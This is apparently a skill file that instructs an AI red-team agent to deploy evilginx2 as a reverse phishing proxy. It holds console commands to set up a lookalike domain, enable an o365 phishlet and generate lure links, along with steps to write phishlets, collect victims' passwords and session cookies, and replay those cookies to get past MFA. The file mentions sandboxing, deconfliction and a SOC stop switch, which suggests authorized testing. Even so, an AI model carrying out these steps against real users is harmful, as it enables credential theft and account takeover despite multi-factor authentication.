---
name: evilginx2-proxy
description: >
  Author and deploy an evilginx2 phishlet to reverse-proxy a real login and capture
  the post-authentication session cookie, defeating MFA via session-token theft.
metadata:
  subdomain: phishing
  when_to_use: "evilginx2, mfa bypass, session cookie capture, reverse proxy phishing, phishlet, adversary in the middle, aitm"
  mitre_attack:
    - T1566.002
    - T1557
    - T1539
    - T1111
  tags:
    - phishing
    - evilginx
    - mfa-bypass
    - aitm
---

# evilginx2 Phishlet (AiTM)

When the target enforces MFA, a static fake login page is useless —
you need the authenticated **session cookie**. evilginx2 is an
adversary-in-the-middle reverse proxy: the victim authenticates against
the *real* site through your proxy, MFA included, and you capture the
resulting session token for replay.

## Prerequisites

- evilginx2 in the sandbox; ports 443/53 free.
- A lookalike domain with an A record to the sandbox and NS delegation
  so evilginx2 can answer ACME (`lookalike-domain`).
- The `lure-deconfliction` handshake COMPLETE.

## Deploy

```bash
# DNS + cert: evilginx manages Let's Encrypt automatically
evilginx2 -p /opt/evilginx/phishlets
# in the evilginx console:
config domain login.acme-portal.example
config ipv4 <sandbox-ip>
phishlets hostname o365 login.acme-portal.example
phishlets enable o365
lures create o365
lures get-url 0          # -> the link you put in the GoPhish email
```

## Authoring a phishlet (when none ships for the target)

A phishlet is a YAML map of the target's auth hosts, the sub_filters
that rewrite the real domain to yours in responses, and the
`auth_tokens` (which cookies signal a completed login). Capture a
normal login in a proxy, identify the session cookie(s) the app sets
post-MFA, and list them under `auth_tokens`. Keep ACME challenge paths
off the proxied auth path.

## Capture + replay

```bash
# evilginx console: list captured sessions
sessions
sessions <id>            # shows username, password, and the tokens (cookie JSON)
```

Import the captured cookie JSON into a clean browser profile / a
`Cookie` header to ride the authenticated session without
re-triggering MFA.

## Evidence

Captured session → `Credential` node (type `session-token`) linked to
the `User` node with the lure id. Save the session JSON under
`evidence/phisher/<id>-session.json`. Note the estimated token TTL.

## OPSEC

- One phishlet per engagement domain; rotate after the engagement.
- The session token is the crown jewel — store ONLY in `evidence/` +
  the knowledge graph, never anywhere off-box.
- `evilginx_disable_phishlet` (`phishlets disable o365`) returns 502 on
  a SOC stop request.
